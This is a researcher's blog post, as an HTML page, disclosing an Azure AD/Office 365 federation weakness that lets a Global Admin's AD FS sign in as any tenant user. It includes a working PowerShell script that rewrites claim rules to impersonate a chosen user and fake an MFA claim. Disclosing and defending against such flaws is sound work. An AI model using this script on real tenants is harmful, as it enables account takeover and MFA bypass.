<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security vulnerability in Azure AD &amp; Office 365 identity federation</title>
<meta name="description" content="The toolkit for Azure AD hackers, bounty hunters, red/blue teamers">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Security vulnerability in Azure AD &amp; Office 365 identity federation" />
<meta property="og:description" content="In this blog, I will describe a security vulnerability I discovered and reported to Microsoft in October. The vulnerability was disclosed in LIVE!360 TECHMENTOR event in Orlando on Nov 16th 2017.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://aadinternals.com/post/federation-vulnerability/" />



<meta property="article:published_time" content="2017-11-16T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2018-07-24T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-3XCVLYZKDW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-3XCVLYZKDW');
</script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="AADInternals.com" rel="home">
						<img src="/images/favicon-128.png" alt="Homepage"><h1 class="logo__title">AADInternals.com</h1>
						<h2 class="logo__tagline">The ultimate Entra ID (Azure AD) / Microsoft 365 hacking and admin toolkit</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">DOCUMENTATION</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/osint/">OSINT</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Security vulnerability in Azure AD &amp; Office 365 identity federation</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2017-11-16T00:00:00">November 16, 2017</time>
					<time class="post__meta-lastmod" datetime="2018-07-24T00:00:00"> (Last Modified: July 24, 2018)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2fpost%2ffederation-vulnerability%2f&text=Security%20vulnerability%20in%20Azure%20AD%20%26%20Office%20365%20identity%20federation&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2fpost%2ffederation-vulnerability%2f&mini=true&title=Security%20vulnerability%20in%20Azure%20AD%20%26%20Office%20365%20identity%20federation&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/federation-vulnerability.png" alt="Security vulnerability in Azure AD &amp; Office 365 identity federation">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#description">Description</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#solution">Solution</a></li>
<li><a href="#update-microsoft-s-response">Update: Microsoft&rsquo;s response</a></li>
</ul>
</nav>
			<p>In this blog, I will describe a security vulnerability I discovered and reported to Microsoft in October. The vulnerability was disclosed in LIVE!360 <a href="https://techmentorevents.com/ecg/live360events/events/orlando-2017/techmentor.aspx" target=”_blank”>TECHMENTOR</a> event in Orlando on Nov 16th 2017.</p>

<p></p>

<h1 id="overview">Overview</h1>

<p>Federation trust created in Azure AD for a domain is tenant-wide, allowing logging in as any tenant user.</p>

<h1 id="description">Description</h1>

<p>Identity federation between the on-premise directory and Azure AD can be implemented using different technologies. In this blog, I will use Active Directory Federation Services (AD FS) as an example.</p>

<p>There are two authentication types for domains in Azure AD; managed and federated. The difference between the two is how the users of that domain are authenticated. For managed domains, the users are always authenticated against the Azure AD. User objects and passwords are created directly to the Azure AD, or they can be synced from the on-premises directory. For federated domains, the authentication takes place outside the Azure AD, usually on on-premises AD FS server. This kind of arrangement is called a trust between Azure AD and AD FS.</p>

<p>It is fair to assume that the trust would be a domain-wide, i.e., AD FS could authenticate only users of the domain the trust is created. But no, this is not the case. All trusts are tenant-wide, i.e., any AD FS can authenticate users for any domain the tenant has. Before discussing the details, we need to understand how the federation trust works.</p>

<p>To convert a domain to federated, you just simply run a PowerShell command on your AD FS server:
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="nb">Convert-MsolDomainToFederated</span> <span class="n">-DomainName</span> <span class="n">any</span><span class="p">.</span><span class="n">o365domain</span><span class="p">.</span><span class="n">org</span>
</code></pre></div>
</p>

<p>Naturally, you must set up and configure the AD FS server before running the command. When you run the command, it sets all the required information about the AD FS to Azure AD for the federated domain. It also creates a relying party trust for the Azure AD to the local AD FS server. When a user is authenticated on AD FS, it creates a security token including claims about the user’s identity. With Azure AD, two claims are used for authentication; <em>UserPrincipalName</em> and <em>ImmutabledId</em>. The former is self-explanatory, but the latter one is not as obvious. Basically, the <em>ImmutableId</em> could be any string, as long as it matches the <em>ImmutableId</em> attribute of the user object in Azure AD. Typically the <em>ImmutableId</em> is a base 64 encoded GUID of the user object in on-premises AD (to convert GUID to immutable ID see the <a href="/tools/" target=”_blank”>tools</a> page). Converting the domain to federated also creates two claim issuance rules. For short, the rules add the <em>UserPrincipalName</em> and <em>ImmutableId</em> claims of the logged in user to the security token. When security token is delivered to Azure authentication platform, it checks the token signature, and if it matches the trust, the user is granted access.</p>

<p>So, to authenticate user, the security token must have claims for <em>UserPrincipalName</em> and <em>ImmutableId</em>, but <strong>only the ImmutableId</strong> must match the user’s information in Azure AD. Moreover, Azure AD does not check which users the AD FS tries to authenticate, it only checks the token signature. As a result, <strong>any AD FS server can authenticate any user of any domain of the tenant!</strong> Yes, you can also authenticate as <em>.onmicrosoft.com</em> users and external users, as long as the <em>ImmutableId</em> matches.</p>

<p>For cloud-only users (i.e., those not synced from on-premises AD), <em>.onmicrosoft.com</em>, and external users, you need to set the <em>ImmutableId</em> using the following command:
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="nb">Set-MsolUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">&quot;user@mytenant.onmicrosoft.com&quot;</span> <span class="n">-ImmutableId</span> <span class="s2">&quot;anystring&quot;</span>
</code></pre></div>
</p>

<p>To log in as any user you want, you need to alter the default claim issuance rules. The following script prompts you for the UserPrincipalName and ImmutableId of the user and alters the rules.
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="nv">$rules_file</span><span class="p">=</span><span class="s2">&quot;$HOME\adfs_rules.txt&quot;</span>

<span class="c"># Prompt for the UserPrincipalName and ImmutableId</span>
<span class="nv">$upn</span><span class="p">=</span><span class="nb">Read-Host</span> <span class="n">-Prompt</span> <span class="s2">&quot;Give the UserPrincipalName&quot;</span>
<span class="nv">$immutableid</span><span class="p">=</span><span class="nb">Read-Host</span> <span class="n">-Prompt</span> <span class="s2">&quot;Give the ImmutableId for $upn&quot;</span>

<span class="c"># Create UserPrincipalName rule</span>
<span class="nv">$upn_rule</span><span class="p">=</span><span class="s2">&quot;=&gt; issue(Type = &quot;&quot;http://schemas.xmlsoap.org/claims/UPN&quot;&quot;, Value=&quot;&quot;$upn&quot;&quot;);&quot;</span>

<span class="c"># Create Immutable Id rule</span>
<span class="nv">$immutableid_rule</span><span class="p">=</span><span class="s2">&quot;=&gt; issue(Type = &quot;&quot;http://schemas.microsoft.com/LiveID/Federation/2008/05/ImmutableID&quot;&quot;, Value=&quot;&quot;$immutableid&quot;&quot;);&quot;</span>

<span class="c"># Create a rule to bypass Multi Factor Authentication (not mandatory)</span>
<span class="nv">$bypass_mfa_rule</span><span class="p">=</span><span class="s2">&quot;=&gt; issue(Type = &quot;&quot;http://schemas.microsoft.com/claims/authnmethodsreferences&quot;&quot;, Value =&quot;&quot;http://schemas.microsoft.com/claims/multipleauthn&quot;&quot;);&quot;</span>

<span class="c"># Create the rules file</span>
<span class="nb">New-Item</span> <span class="nv">$rules_file</span> <span class="n">-type</span> <span class="n">file</span> <span class="n">-Force</span> <span class="n">-Value</span> <span class="s2">&quot;$upn_rule</span><span class="se">`r`n</span><span class="s2">$immutableid_rule</span><span class="se">`r`n</span><span class="s2">$bypass_mfa_rule&quot;</span>

<span class="c"># Apply the new rules</span>
<span class="nb">Set-AdfsRelyingPartyTrust</span> <span class="n">-TargetName</span> <span class="s2">&quot;Microsoft Office 365 Identity Platform&quot;</span> <span class="n">-IssuanceTransformRulesFile</span> <span class="nv">$rules_file</span> 
</code></pre></div>
</p>

<p>After altering the rules, login to AD FS using any existing credentials, and you’ll be logged in as the user specified by the rules above.</p>

<p><strong>Note!</strong> To exploit the vulnerability, you don&rsquo;t need access to organization&rsquo;s AD FS server. You only need Global Admin rights to Azure AD/Office 365, a domain to convert to federated, and a standalone server with AD DS and AD FS.</p>

<h1 id="impact">Impact</h1>

<p>The vulnerability impacts all Office 365 and Azure AD tenants.</p>

<h1 id="solution">Solution</h1>

<p>There is no known solution for the vulnerability. To minimize the risk of exploitation, remove ALL unnecessary Global Admin rights from Azure AD / Office 365 and limit access to existing AD FS server.</p>

<h1 id="update-microsoft-s-response">Update: Microsoft&rsquo;s response</h1>

<p>I finally got a response from Microsoft on Feb 8th 2018:</p>

<blockquote>
<p>&ldquo;Microsoft does not consider the described to be a security threat in Office 365.&rdquo;</p>
</blockquote>

<p>Apparently this means that this will not be fixed and the &ldquo;feature&rdquo; will remain also in the future. This is alarming to Europen organizations, as their <strong>Office 365 environments are not GDPR compliant</strong>.</p>

<p>I&rsquo;ll be working to find a solution to prevent the exploitation of the vulnerability.</p>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/office365/" rel="tag">Office365</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/security/" rel="tag">Security</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2fpost%2ffederation-vulnerability%2f&text=Security%20vulnerability%20in%20Azure%20AD%20%26%20Office%20365%20identity%20federation&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2fpost%2ffederation-vulnerability%2f&mini=true&title=Security%20vulnerability%20in%20Azure%20AD%20%26%20Office%20365%20identity%20federation&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Principal Identity Security Researcher at Microsoft Security Research. <br> Before his security researcher career, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Entra ID (Azure AD) security. <br><br>Before joining Microsoft, Dr Syynimaa was Microsoft MVP in security category and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/live360_2017/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">LIVE!360 event started today</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/ps-module/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Azure AD PowerShell module installation got easier</p></a>
	</div>
</nav>

	
</main>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
